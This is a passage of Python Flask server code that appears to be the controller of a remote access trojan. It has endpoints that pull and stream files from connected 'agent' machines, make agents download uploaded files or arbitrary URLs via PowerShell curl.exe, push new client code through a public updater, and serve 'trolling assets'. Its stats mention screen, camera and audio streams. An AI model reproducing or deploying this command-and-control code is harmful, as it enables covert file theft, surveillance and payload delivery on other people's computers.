    """Browse files on an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    path = request.args.get('path', '/')
    
    # In a real implementation, this would request files from the agent
    # For now, return mock data
    files = [
        {'name': '..', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '..'},
        {'name': 'Documents', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/Documents'},
        {'name': 'Downloads', 'type': 'directory', 'size': None, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/Downloads'},
        {'name': 'config.txt', 'type': 'file', 'size': 1024, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/config.txt', 'extension': 'txt'},
        {'name': 'data.json', 'type': 'file', 'size': 2048, 'modified': datetime.datetime.utcnow().isoformat() + 'Z', 'path': '/data.json', 'extension': 'json'}
    ]
    
    return jsonify({
        'files': files,
        'current_path': path,
        'total_count': len(files)
    })

@app.route('/api/agents/<agent_id>/files/download', methods=['POST'])
@require_auth
def download_file(agent_id):
    """Download a file from an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    file_path = request.json.get('path')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400
    
    # Generate download ID
    download_id = f"dl_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Emit to agent
    socketio.emit('download_file', {
        'path': file_path,
        'download_id': download_id
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'download_id': download_id,
        'file_path': file_path
    })

@app.route('/api/agents/<agent_id>/files/upload', methods=['POST'])
@require_auth
def upload_file(agent_id):
    """Upload a file to an agent via HTTP (multipart/form-data)"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    f = request.files['file']
    if not f or not f.filename:
        return jsonify({'error': 'No file selected'}), 400
    destination = request.form.get('destination') or ''
    operator_sid = request.form.get('socket_sid') or ''
    upload_id = f"ul_{int(time.time())}_{secrets.token_hex(4)}"
    try:
        base_dir = os.path.join(os.getcwd(), 'uploads', 'http')
        os.makedirs(base_dir, exist_ok=True)
        temp_path = os.path.join(base_dir, f"{upload_id}_{os.path.basename(f.filename)}")
        f.save(temp_path)
        try:
            if operator_sid:
                UPLOAD_REQUESTERS[upload_id] = operator_sid
        except Exception:
            pass
        try:
            socketio.emit('upload_file_start', {
                'agent_id': agent_id,
                'upload_id': upload_id,
                'filename': os.path.basename(f.filename),
                'destination': destination,
                'total_size': os.path.getsize(temp_path)
            }, room=agent_sid)
        except Exception:
            pass
        try:
            chunk_size = 512 * 1024
            total_size = os.path.getsize(temp_path)
            with open(temp_path, 'rb') as fin:
                off = 0
                while True:
                    chunk = fin.read(chunk_size)
                    if not chunk:
                        break
                    b64 = base64.b64encode(chunk).decode('utf-8')
                    socketio.emit('upload_file_chunk', {
                        'agent_id': agent_id,
                        'upload_id': upload_id,
                        'filename': os.path.basename(f.filename),
                        'destination': destination,
                        'total_size': total_size,
                        'chunk': b64,
                        'offset': off
                    }, room=agent_sid)
                    _upload_debug_log(upload_id, f"server_chunk off={off} len={len(chunk)}")
                    off += len(chunk)
                    try:
                        prog = int(min(100, (off / float(total_size or 1)) * 100))
                        sid = UPLOAD_REQUESTERS.get(upload_id) or operator_sid or None
                        resolved = _resolve_destination_for_agent(destination)
                        payload = {
                            'agent_id': agent_id,
                            'upload_id': upload_id,
                            'filename': os.path.basename(f.filename),
                            'destination_path': resolved,
                            'received': off,
                            'total': total_size,
                            'progress': prog,
                            'source': 'server'
                        }
                        if sid:
                            socketio.emit('file_upload_progress', payload, room=sid)
                        socketio.emit('file_upload_progress', payload, room='operators')
                    except Exception:
                        pass
            socketio.emit('upload_file_complete', {
                'agent_id': agent_id,
                'upload_id': upload_id,
                'filename': os.path.basename(f.filename),
                'destination': destination,
                'total_size': os.path.getsize(temp_path)
            }, room=agent_sid)
            _upload_debug_log(upload_id, "server_complete")
            try:
                sid = UPLOAD_REQUESTERS.get(upload_id) or operator_sid or None
                resolved = _resolve_destination_for_agent(destination)
                complete_payload = {
                    'agent_id': agent_id,
                    'upload_id': upload_id,
                    'filename': os.path.basename(f.filename),
                    'destination_path': resolved,
                    'size': os.path.getsize(temp_path),
                    'success': True,
                    'source': 'server'
                }
                if sid:
                    socketio.emit('file_upload_complete', complete_payload, room=sid)
                socketio.emit('file_upload_complete', complete_payload, room='operators')
            except Exception:
                pass
        finally:
            try:
                os.remove(temp_path)
            except Exception:
                pass
        return jsonify({'success': True, 'upload_id': upload_id, 'filename': f.filename})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/agents/<agent_id>/files/upload_p2p', methods=['POST'])
@require_auth
def upload_file_p2p(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    f = request.files['file']
    if not f or not f.filename:
        return jsonify({'error': 'No file selected'}), 400
    destination = request.form.get('destination') or ''
    operator_sid = request.form.get('socket_sid') or ''
    upload_id = f"ul_p2p_{int(time.time())}_{secrets.token_urlsafe(4)}"
    try:
        base_dir = os.path.join(os.getcwd(), 'uploads', 'p2p')
        os.makedirs(base_dir, exist_ok=True)
        temp_path = os.path.join(base_dir, f"{upload_id}_{os.path.basename(f.filename)}")
        f.save(temp_path)
        agent_ip = AGENTS_DATA[agent_id].get('ip', '').strip() or (request.remote_addr or '127.0.0.1')
        from controller_p2p_transfer import start_p2p_upload
        port = start_p2p_upload(agent_ip, temp_path, upload_id)
        size = os.path.getsize(temp_path)
        sha = hashlib.sha256(open(temp_path, 'rb').read()).hexdigest()
        socketio.emit('p2p_download_request', {
            'agent_id': agent_id,
            'upload_id': upload_id,
            'filename': os.path.basename(f.filename),
            'destination': destination,
            'controller_ip': request.host.split(':')[0],
            'controller_port': port,
            'file_size': size,
            'sha256': sha
        }, room=agent_sid)
        def _cleanup():
            time.sleep(120)
            try:
                os.remove(temp_path)
            except Exception:
                pass
        threading.Thread(target=_cleanup, daemon=True).start()
        return jsonify({'success': True, 'upload_id': upload_id, 'filename': f.filename, 'controller_port': port})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/agents/<agent_id>/upload/<path:virtual_path>/<filename>', methods=['POST'])
@require_auth
def upload_file_rest(agent_id, virtual_path, filename):
    """REST-style raw body upload: POST /api/agents/{agent_id}/upload/{virtual_path}/{filename}
    Body is the file bytes; forwards to agent via Socket.IO chunk stream."""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    try:
        # Normalize virtual path: '_' or '~' means agent home
        destination = virtual_path.strip()
        if destination in {'_', '~'}:
            destination = ''
        upload_id = f"ul_rest_{int(time.time())}_{secrets.token_hex(4)}"
        base_dir = os.path.join(os.getcwd(), 'uploads', 'rest')
        os.makedirs(base_dir, exist_ok=True)
        temp_path = os.path.join(base_dir, f"{upload_id}_{os.path.basename(filename)}")
        # Stream request body to temp file
        chunk_size = 512 * 1024
        total_size = 0
        with open(temp_path, 'wb') as fout:
            while True:
                chunk = request.stream.read(chunk_size)
                if not chunk:
                    break
                fout.write(chunk)
                total_size += len(chunk)
        # Emit start to agent
        try:
            socketio.emit('upload_file_start', {
                'agent_id': agent_id,
                'upload_id': upload_id,
                'filename': os.path.basename(filename),
                'destination': destination,
                'total_size': total_size
            }, room=agent_sid)
        except Exception:
            pass
        # Forward chunks to agent
        try:
            with open(temp_path, 'rb') as fin:
                off = 0
                while True:
                    chunk = fin.read(chunk_size)
                    if not chunk:
                        break
                    b64 = base64.b64encode(chunk).decode('utf-8')
                    socketio.emit('upload_file_chunk', {
                        'agent_id': agent_id,
                        'upload_id': upload_id,
                        'filename': os.path.basename(filename),
                        'destination': destination,
                        'total_size': total_size,
                        'chunk': b64,
                        'offset': off
                    }, room=agent_sid)
                    _upload_debug_log(upload_id, f"rest_chunk off={off} len={len(chunk)}")
                    off += len(chunk)
            socketio.emit('upload_file_complete', {
                'agent_id': agent_id,
                'upload_id': upload_id,
                'filename': os.path.basename(filename),
                'destination': destination,
                'total_size': total_size
            }, room=agent_sid)
            _upload_debug_log(upload_id, "rest_complete")
        except Exception:
            pass
        finally:
            try:
                os.remove(temp_path)
            except Exception:
                pass
        # Return REST response
        return jsonify({'success': True, 'upload_id': upload_id, 'filename': filename, 'bytes': total_size}), 201
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/download/staged/<upload_id>/<filename>', methods=['GET'])
def download_staged_file(upload_id, filename):
    """Serve staged file for agent PowerShell curl download."""
    info = _stage_get(upload_id)
    if not info:
        return jsonify({'error': 'Not found'}), 404
    path = info.get('path')
    if not path or not os.path.isfile(path):
        return jsonify({'error': 'File missing'}), 404
    resp = send_file(path, as_attachment=True, download_name=filename)
    resp.headers['Cache-Control'] = 'private, max-age=600'
    return resp

@app.route('/download/updater/<path:filename>', methods=['GET'])
def download_updater_file(filename):
    _ensure_updater_dir()
    path = os.path.join(UPDATER_DIR, filename)
    if not os.path.isfile(path):
        return jsonify({'error': 'Not found'}), 404
    return send_file(path, as_attachment=True, download_name=os.path.basename(filename))

@app.route('/download/updater/client.py', methods=['GET'])
def download_updater_client_alias():
    """
    Serve the latest pushed client as client.py for compatibility,
    while the on-disk filename remains client_latest.py.
    """
    _ensure_updater_dir()
    path = UPDATER_CLIENT_PATH
    if not os.path.isfile(path):
        return jsonify({'error': 'Not found'}), 404
    return send_file(path, as_attachment=True, download_name='client.py')

@app.route('/download/updater/latest.json', methods=['GET'])
def download_updater_latest_public():
    """
    Public endpoint for bootstrap scripts to discover latest client.py info (version, sha256, download_url).
    Mirrors /api/updater/latest but without auth.
    """
    state = _read_updater_state()
    if os.path.exists(UPDATER_CLIENT_PATH):
        try:
            size = os.path.getsize(UPDATER_CLIENT_PATH)
        except Exception:
            size = 0
    else:
        size = 0
    return jsonify({
        'version': str(state.get('version') or ''),
        'sha256': str(state.get('sha256') or ''),
        'download_url': str(state.get('download_url') or ''),
        'last_push': str(state.get('last_push') or ''),
        'size': size
    })

@app.route('/api/updater/latest', methods=['GET'])
@require_auth
def get_updater_latest():
    state = _read_updater_state()
    if os.path.exists(UPDATER_CLIENT_PATH):
        try:
            size = os.path.getsize(UPDATER_CLIENT_PATH)
        except Exception:
            size = 0
    else:
        size = 0
    return jsonify({
        'version': str(state.get('version') or ''),
        'sha256': str(state.get('sha256') or ''),
        'download_url': str(state.get('download_url') or ''),
        'last_push': str(state.get('last_push') or ''),
        'size': size
    })

@app.route('/api/updater/push', methods=['POST'])
@require_auth
def push_updater():
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    code = str(data.get('code') or '')
    version = str(data.get('version') or '')
    if not code:
        return jsonify({'error': 'Code required'}), 400
    _ensure_updater_dir()
    # Write latest and versioned artifacts
    try:
        with open(UPDATER_CLIENT_PATH, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(code)
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    if not version:
        version = str(int(time.time()))
    versioned_name = f"client_V{version}.py"
    versioned_path = os.path.join(UPDATER_DIR, versioned_name)
    try:
        with open(versioned_path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(code)
    except Exception:
        pass
    sha256 = _compute_sha256(UPDATER_CLIENT_PATH)
    # Prefer versioned download URL
    try:
        dl = url_for('download_updater_file', filename=versioned_name, _external=True)
    except Exception:
        dl = request.url_root.rstrip('/') + f"/download/updater/{versioned_name}"
    state = {
        'version': version,
        'sha256': sha256,
        'download_url': dl,
        'last_push': datetime.datetime.utcnow().isoformat() + 'Z'
    }
    try:
        with open(UPDATER_STATE_PATH, 'w', encoding='utf-8', errors='ignore') as f:
            json.dump(state, f, indent=2)
    except Exception:
        pass
    return jsonify(state)

@app.route('/api/system/update-agent', methods=['POST'])
@require_auth
def update_agent():
    try:
        vbs_path = os.path.join(os.path.dirname(__file__), 'client_launcher.vbs')
        if not os.path.exists(vbs_path):
            return jsonify({'error': 'client_launcher.vbs not found'}), 404
        result = subprocess.run(['wscript.exe', vbs_path], cwd=os.path.dirname(__file__), capture_output=True, text=True, timeout=60)
        return jsonify({'success': True, 'exit_code': result.returncode, 'stdout': (result.stdout or '')[:2000], 'stderr': (result.stderr or '')[:2000]})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/agents/<agent_id>/files/upload_pscurl', methods=['POST'])
@require_auth
def upload_file_pscurl(agent_id):
    """Stage file on controller and instruct agent to download via PowerShell curl.exe."""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    f = request.files['file']
    if not f or not f.filename:
        return jsonify({'error': 'No file selected'}), 400
    destination = request.form.get('destination') or ''
    operator_sid = request.form.get('socket_sid') or ''
    upload_id = f"pscurl_{int(time.time())}_{secrets.token_hex(4)}"
    try:
        # Stage file
        base_dir = os.path.join(os.getcwd(), 'uploads', 'staged')
        os.makedirs(base_dir, exist_ok=True)
        safe_name = os.path.basename(f.filename)
        temp_path = os.path.join(base_dir, f"{upload_id}_{safe_name}")
        f.save(temp_path)
        _stage_register(upload_id, temp_path, safe_name)
        # Build external download URL
        try:
            file_url = url_for('download_staged_file', upload_id=upload_id, filename=safe_name, _external=True)
        except Exception:
            # Fallback
            file_url = request.url_root.rstrip('/') + f"/download/staged/{upload_id}/{safe_name}"
        # Resolve destination directory for agent
        dst_dir = _resolve_destination_for_agent(destination)
        if not dst_dir:
            dst_dir = ''
        dst_sep = '\\' if (dst_dir and (dst_dir.startswith('\\') or ':' in dst_dir)) else '/'
        download_path = (dst_dir + (dst_sep if not dst_dir.endswith(dst_sep) and dst_dir != '' else '')) + safe_name if dst_dir else safe_name
        # Build PowerShell command string for diagnostics
        _u = file_url.replace("'", "''")
        _p = download_path.replace("'", "''")
        ps_cmd = f"$u='{_u}'; $p='{_p}'; curl.exe -L $u -o $p"
        # Ask agent to download via PowerShell curl with progress
        try:
            socketio.emit('ps_curl_download', {
                'agent_id': agent_id,
                'upload_id': upload_id,
                'url': file_url,
                'download_path': download_path,
                'filename': safe_name,
                'expected_size': os.path.getsize(temp_path)
            }, room=agent_sid)
        except Exception:
            pass
        # Notify operator (progress only). Avoid duplicate success notifications.
        try:
            socketio.emit('file_upload_progress', {'agent_id': agent_id, 'upload_id': upload_id, 'filename': safe_name, 'progress': 0, 'source': 'server'}, room='operators')
        except Exception:
            pass
        # Schedule cleanup
        def _cleanup():
            time.sleep(600)
            _stage_cleanup(upload_id)
        threading.Thread(target=_cleanup, daemon=True).start()
        return jsonify({'success': True, 'upload_id': upload_id, 'filename': safe_name, 'staged_url': file_url, 'destination_path': download_path, 'command': ps_cmd})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/agents/<agent_id>/files/download_url', methods=['POST'])
@require_auth
def download_url_to_agent(agent_id):
    """Ask agent to download an external URL via PowerShell curl.exe"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    url = str(data.get('url') or '')
    destination = str(data.get('destination') or '')
    filename = os.path.basename(str(data.get('filename') or ''))
    if not url:
        return jsonify({'error': 'URL required'}), 400
    upload_id = f"url_{int(time.time())}_{secrets.token_hex(4)}"
    # Try to get expected size via HEAD from controller (best-effort)
    expected_size = 0
    try:
        import requests  # best-effort if available
        r = requests.head(url, timeout=10, allow_redirects=True)
        cl = r.headers.get('Content-Length') or ''
        if cl.isdigit():
            expected_size = int(cl)
    except Exception:
        expected_size = 0
    try:
        socketio.emit('ps_curl_download', {
            'agent_id': agent_id,
            'upload_id': upload_id,
            'url': url,
            'download_path': destination and os.path.join(destination, filename) if filename else destination,
            'filename': filename or os.path.basename(url.split('?')[0] or 'download.bin'),
            'expected_size': expected_size
        }, room=agent_sid)
    except Exception:
        pass
    return jsonify({'success': True, 'upload_id': upload_id, 'url': url, 'destination': destination, 'filename': filename, 'expected_size': expected_size})

@app.route('/api/agents/<agent_id>/files/stream', methods=['GET'])
@require_auth
def stream_agent_file(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400

    file_path = request.args.get('path', '')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400

    mime = _guess_mime(file_path)
    range_header = request.headers.get('Range')
    timeout_s = 10.0
    initial_chunk_size = 256 * 1024

    if range_header:
        m = _RANGE_RE.match(range_header.strip())
        if not m:
            return Response(status=416)
        start_s, end_s = m.group(1), m.group(2)
        start = int(start_s) if start_s != '' else None
        end = int(end_s) if end_s != '' else None

        if start is None and end is not None:
            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
            total_size = int(meta.get('total_size') or 0)
            suffix_len = end
            if total_size <= 0 or suffix_len <= 0:
                return Response(status=416)
            start = max(0, total_size - suffix_len)
            end = total_size - 1
        elif end is None:
            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
            total_size = int(meta.get('total_size') or 0)
            if total_size <= 0:
                return Response(status=416)
            chunk_len = initial_chunk_size
            s = int(start or 0)
            e = min(s + chunk_len - 1, total_size - 1)
            start = s
            end = e
        data = _request_agent_file_range(agent_id, agent_sid, file_path, start, end if end is not None else -1, timeout_s)
        if not data:
            return jsonify({'error': 'Timeout'}), 504
        if data.get('error'):
            return jsonify({'error': data.get('error')}), 404

        total_size = int(data.get('total_size') or 0)
        b64 = _extract_b64(data.get('data') or data.get('chunk'))
        if not b64:
            return jsonify({'error': 'Empty response'}), 502
        try:
            raw = base64.b64decode(b64)
        except Exception:
            return jsonify({'error': 'Invalid data'}), 502

        actual_start = int(data.get('start') if data.get('start') is not None else (start or 0))
        actual_end = int(data.get('end') if data.get('end') is not None else (actual_start + len(raw) - 1))
        if total_size > 0:
            actual_end = min(actual_end, total_size - 1)

        resp = Response(raw, status=206, mimetype=mime)
        resp.headers['Accept-Ranges'] = 'bytes'
        resp.headers['Content-Length'] = str(len(raw))
        if total_size > 0:
            resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
        resp.headers['Content-Disposition'] = 'inline'
        resp.headers['Cache-Control'] = 'private, max-age=3600'
        resp.headers['X-Accel-Buffering'] = 'no'
        return resp

    # No Range header: serve initial chunk as partial content for progressive playback
    meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
    if not meta or meta.get('error'):
        return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
    total_size = int(meta.get('total_size') or 0)
    if total_size <= 0:
        return jsonify({'error': 'Empty file'}), 404
    chunk_len = initial_chunk_size
    end = min(chunk_len - 1, total_size - 1)
    data = _request_agent_file_range(agent_id, agent_sid, file_path, 0, end, timeout_s)
    if not data:
        return jsonify({'error': 'Timeout'}), 504
    if data.get('error'):
        return jsonify({'error': data.get('error')}), 404
    b64 = _extract_b64(data.get('data') or data.get('chunk'))
    if not b64:
        return jsonify({'error': 'Empty response'}), 502
    try:
        raw = base64.b64decode(b64)
    except Exception:
        return jsonify({'error': 'Invalid data'}), 502
    actual_start = 0
    actual_end = int(data.get('end') if data.get('end') is not None else end)
    resp = Response(raw, status=206, mimetype=mime)
    resp.headers['Accept-Ranges'] = 'bytes'
    resp.headers['Content-Length'] = str(len(raw))
    resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
    resp.headers['Content-Disposition'] = 'inline'
    resp.headers['Cache-Control'] = 'private, max-age=3600'
    resp.headers['X-Accel-Buffering'] = 'no'
    return resp

@app.route('/api/agents/<agent_id>/files/stream_faststart', methods=['GET'])
@require_auth
def stream_agent_file_faststart(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400

    file_path = request.args.get('path', '')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400

    target_path = file_path
    ext = (os.path.splitext(file_path)[1] or '').lower().lstrip('.')
    should_faststart = ext in {'mp4', 'm4v', 'mov'}
    if should_faststart:
        cached = _faststart_cache_get(agent_id, file_path)
        if cached and cached.get('ok') and isinstance(cached.get('path'), str) and cached.get('path'):
            target_path = str(cached.get('path'))
        elif cached and cached.get('ok') is False:
            target_path = file_path
        else:
            faststart = _request_agent_faststart(agent_id, agent_sid, file_path, False)
            if faststart and not faststart.get('error'):
                p = faststart.get('path') or faststart.get('transformed_path')
                if isinstance(p, str) and p.strip():
                    target_path = p.strip()
                    _faststart_cache_set(agent_id, file_path, target_path, ok=True)
                else:
                    _faststart_cache_set(agent_id, file_path, None, ok=False)
            else:
                _faststart_cache_set(agent_id, file_path, None, ok=False)

    mime = _guess_mime(target_path)
    range_header = request.headers.get('Range')

    if range_header:
        m = _RANGE_RE.match(range_header.strip())
        if not m:
            return Response(status=416)
        start_s, end_s = m.group(1), m.group(2)
        start = int(start_s) if start_s != '' else None
        end = int(end_s) if end_s != '' else None

        if start is None and end is not None:
            meta = _request_agent_file_range(agent_id, agent_sid, target_path, 0, 0)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 404
            total_size = int(meta.get('total_size') or 0)
            suffix_len = end
            if total_size <= 0 or suffix_len <= 0:
                return Response(status=416)
            start = max(0, total_size - suffix_len)
            end = total_size - 1
        elif end is None:
            meta = _request_agent_file_range(agent_id, agent_sid, target_path, 0, 0)
            if not meta or meta.get('error'):
                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 404
            total_size = int(meta.get('total_size') or 0)
            if total_size <= 0:
                return Response(status=416)
            chunk_len = _get_stream_chunk_size(agent_id)
            s = int(start or 0)
            e = min(s + chunk_len - 1, total_size - 1)
            start = s
            end = e

        data = _request_agent_file_range(agent_id, agent_sid, target_path, start, end if end is not None else -1)
        if not data:
            return jsonify({'error': 'Timeout'}), 504
        if data.get('error'):
            return jsonify({'error': data.get('error')}), 404

        total_size = int(data.get('total_size') or 0)
        b64 = _extract_b64(data.get('data') or data.get('chunk'))
        if not b64:
            return jsonify({'error': 'Empty response'}), 502
        try:
            raw = base64.b64decode(b64)
        except Exception:
            return jsonify({'error': 'Invalid data'}), 502

        actual_start = int(data.get('start') if data.get('start') is not None else (start or 0))
        actual_end = int(data.get('end') if data.get('end') is not None else (actual_start + len(raw) - 1))
        if total_size > 0:
            actual_end = min(actual_end, total_size - 1)

        resp = Response(raw, status=206, mimetype=mime)
        resp.headers['Accept-Ranges'] = 'bytes'
        resp.headers['Content-Length'] = str(len(raw))
        if total_size > 0:
            resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
        resp.headers['Content-Disposition'] = 'inline'
        resp.headers['Cache-Control'] = 'private, max-age=30'
        resp.headers['X-Accel-Buffering'] = 'no'
        return resp

    # No Range header: serve initial chunk as partial content for progressive playback
    meta = _request_agent_file_range(agent_id, agent_sid, target_path, 0, 0)
    if not meta or meta.get('error'):
        return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
    total_size = int(meta.get('total_size') or 0)
    if total_size <= 0:
        return jsonify({'error': 'Empty file'}), 404
    chunk_len = _get_stream_chunk_size(agent_id)
    end = min(chunk_len - 1, total_size - 1)
    _t0 = time.time()
    data = _request_agent_file_range(agent_id, agent_sid, target_path, 0, end)
    _elapsed = time.time() - _t0
    if not data:
        _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
        return jsonify({'error': 'Timeout'}), 504
    if data.get('error'):
        _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
        return jsonify({'error': data.get('error')}), 404
    b64 = _extract_b64(data.get('data') or data.get('chunk'))
    if not b64:
        return jsonify({'error': 'Empty response'}), 502
    try:
        raw = base64.b64decode(b64)
    except Exception:
        return jsonify({'error': 'Invalid data'}), 502
    actual_start = 0
    actual_end = int(data.get('end') if data.get('end') is not None else end)
    resp = Response(raw, status=206, mimetype=mime)
    resp.headers['Accept-Ranges'] = 'bytes'
    resp.headers['Content-Length'] = str(len(raw))
    resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
    resp.headers['Content-Disposition'] = 'inline'
    resp.headers['Cache-Control'] = 'private, max-age=30'
    resp.headers['X-Accel-Buffering'] = 'no'
    _adjust_stream_chunk_size(agent_id, _elapsed, success=True)
    return resp

@app.route('/api/agents/<agent_id>/files/thumbnail', methods=['GET'])
@require_auth
def thumbnail_agent_file(agent_id):
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400

    file_path = request.args.get('path', '')
    if not file_path:
        return jsonify({'error': 'File path is required'}), 400

    try:
        size = int(request.args.get('size', '128'))
    except Exception:
        size = 128
    size = max(16, min(size, 256))

    timeout_s = 5.0
    data = _request_agent_thumbnail(agent_id, agent_sid, file_path, size, timeout_s)
    if not data:
        return jsonify({'error': 'Timeout'}), 504
    if data.get('error'):
        return jsonify({'error': data.get('error')}), 404

    mime = str(data.get('mime') or 'image/jpeg')
    b64 = _extract_b64(data.get('data') or data.get('thumb') or data.get('chunk'))
    if not b64:
        return jsonify({'error': 'Empty response'}), 502
    try:
        raw = base64.b64decode(b64)
    except Exception:
        return jsonify({'error': 'Invalid data'}), 502

    resp = Response(raw, status=200, mimetype=mime)
    resp.headers['Cache-Control'] = 'public, max-age=7200, immutable'
    resp.headers['Content-Length'] = str(len(raw))
    resp.headers['Content-Disposition'] = 'inline'
    return resp

# Serve controller-hosted trolling assets
@app.route('/troll-assets/<asset_id>')
def serve_troll_asset(asset_id):
    try:
        exp = int(request.args.get('exp') or 0)
        sig = request.args.get('sig') or ''
        if exp <= int(time.time()):
            return ("expired", 410)
        sig_src = f'{asset_id}.{exp}.{Config.SECRET_KEY}'
        expected = hashlib.sha256(sig_src.encode()).hexdigest()
        if sig != expected:
            return ("forbidden", 403)
        meta = TROLL_ASSETS.get(asset_id)
        if not meta or not os.path.isfile(meta['path']):
            return ("not found", 404)
        mime = mimetypes.guess_type(meta['path'])[0] or 'application/octet-stream'
        return send_file(meta['path'], mimetype=mime)
    except Exception:
        return ("server error", 500)
# System Monitoring API
@app.route('/api/system/stats', methods=['GET'])
@require_auth
def get_system_stats():
    """Get overall system statistics"""
    online_agents = [a for a in AGENTS_DATA.values() if a.get('sid')]
    
    stats = {
        'agents': {
            'total': len(AGENTS_DATA),
            'online': len(online_agents),
            'offline': len(AGENTS_DATA) - len(online_agents)
        },
        'streams': {
            'active': 2,  # Mock data
            'screen': 1,
            'camera': 1,
            'audio': 0
        },
        'commands': {
            'executed_today': 127,  # Mock data
            'successful': 115,
            'failed': 12
        },
        'network': {
            'status': 'stable',
            'latency': 12,
            'throughput': 2.4
        }
    }
    
    return jsonify(stats)

@app.route('/api/agents/<agent_id>/performance', methods=['GET'])
@require_auth
def get_agent_performance(agent_id):
    """Get performance metrics for a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = AGENTS_DATA[agent_id]
    
    # Mock performance data - in real implementation, this would come from the agent
    performance = {
        'cpu': {
            'usage': data.get('cpu_usage', 45),
            'temperature': 65,
            'cores': 8,
            'frequency': 3.2
        },
        'memory': {
            'used': data.get('memory_usage', 62),
            'total': 16,
            'available': 6.1
        },
        'storage': {
            'used': 78,
            'total': 500,
            'available': 110
        },
        'network': {
            'upload': 2.4,
            'download': 15.7,
            'latency': data.get('network_latency', 12)
        }
    }
    
    return jsonify(performance)

# Activity Feed API
@app.route('/api/activity', methods=['GET'])
@require_auth
def get_activity_feed():
    """Get activity feed with optional filtering"""
    activity_type = sanitize_input(request.args.get('type', 'all'))
    try:
        limit = int(request.args.get('limit', 50))
    except Exception:
        limit = 50
    
    # Mock activity data - in real implementation, this would be stored in a database
    activities = [
        {
            'id': 'act-001',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': 'Successfully established connection',
            'agent_id': 'agent-001',
            'agent_name': 'Windows-Desktop-01',
            'timestamp': (datetime.datetime.utcnow() - datetime.timedelta(seconds=30)).isoformat() + 'Z',
            'status': 'success'
        },
        {
            'id': 'act-002',
            'type': 'stream',
            'action': 'Screen Stream Started',
